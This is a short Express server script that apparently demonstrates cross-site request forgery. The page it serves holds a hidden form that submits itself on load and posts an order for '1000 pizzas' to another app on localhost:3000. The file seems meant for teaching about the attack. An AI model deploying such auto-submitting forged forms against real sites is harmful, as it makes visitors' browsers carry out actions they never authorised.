"use strict";

var express = require('express');
var app = express();

app.use(function(req, res, next) {
  var html = '<form id="place-order" action="http://localhost:3000/orders" method="POST">';
  html += '<input type="text" name="order" value="1000 pizzas" />';
  html += '</form>';
  html += '<script>document.getElementById("place-order").submit();</script>'

  res.send(html);
});

app.listen(4000);
console.log('now open http://localhost:4000/ and see what happens');
